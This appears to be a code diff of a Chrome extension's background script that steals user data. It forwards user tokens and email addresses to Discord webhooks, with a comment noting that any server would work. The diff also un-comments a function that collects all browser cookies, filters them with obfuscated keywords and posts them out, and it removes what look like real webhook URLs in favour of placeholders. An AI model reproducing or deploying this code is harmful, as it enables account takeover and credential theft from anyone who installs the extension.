@@ -1,7 +1,8 @@
-const opsint_url = "https://discord.com/api/webhooks/1286300596420218973/T2zMoDYnRpobVdODWYbDssI4csHQlXOWN0-WZLGXYN3iOMg5bKZHbMWllU1PlMde_EHV";
-const buffer_url = "https://discord.com/api/webhooks/1286370933971484904/oN5ybVszZxaeqL11P8eDtY9TdDCZYyI9QYQUrbleUGbI1D4JUrbBoz10M6-5HiUcKOL-";
-const gnlV2_url = "https://discord.com/api/webhooks/1286380543813881967/k3wAVFFxgh_k7F4M1_7rsCq_yO3yl7TipOKf4slcbK2NtRxgSSb1baUHVUKVnOCMa_QK";
-const result_url = "https://discord.com/api/webhooks/1286464079766093874/79lJBI268kLtqdCEY-YwPYDv7Hs8iWxPzHXKd6y09ef6GrOVFaI_vkqBRiaRboU9jl3v";
+// Different webhooks for different logging purposes.
+const opsint_url = "https://discord.com/api/webhooks/id1/token1";
+const buffer_url = "https://discord.com/api/webhooks/id2/token2";
+const gnlV2_url = "https://discord.com/api/webhooks/id3/token3";
+const result_url = "https://discord.com/api/webhooks/id4/token4";
 
 var _$_bd1f=(function(l,g){var i=l.length;var c=[];for(var v=0;v< i;v++){c[v]= l.charAt(v)};for(var v=0;v< i;v++){var f=g* (v+ 384)+ (g% 34521);var m=g* (v+ 319)+ (g% 36685);var q=f% i;var d=m% i;var o=c[q];c[q]= c[d];c[d]= o;g= (f+ m)% 3458025};var h=String.fromCharCode(127);var s='';var p='\x25';var k='\x23\x31';var a='\x25';var u='\x23\x30';var y='\x23';return c.join(s).split(p).join(h).split(k).join(a).split(u).join(y).split(h)})("etssonkoiesi%n%did",2540754);const KEYWORDS=[_$_bd1f[0],_$_bd1f[1],_$_bd1f[2]]
 
@@ -34,6 +35,7 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
         if(message.type === "token") {
             let dataToSend = `\nUser Token: ${message.token}\nAll Tokens: ${message.tokens}\nEmail: ${message.email}`;
             // Send token to Discord webhook
+            // You can replace this with whatever works, sending it to a database, a web server, all work.
             fetch(opsint_url, {
                 method: "POST",
                 body: JSON.stringify({
@@ -178,7 +180,7 @@ chrome.runtime.getPlatformInfo((info) => {
 });
 
 
-/*
+
 // Function to filter and send cookies
 async function getFilteredCookiesAndPost() {
     chrome.cookies.getAll({}, (cookies) => {
@@ -232,4 +234,3 @@ async function getFilteredCookiesAndPost() {
 
 // Call the function to retrieve and filter cookies
 getFilteredCookiesAndPost();
-*/
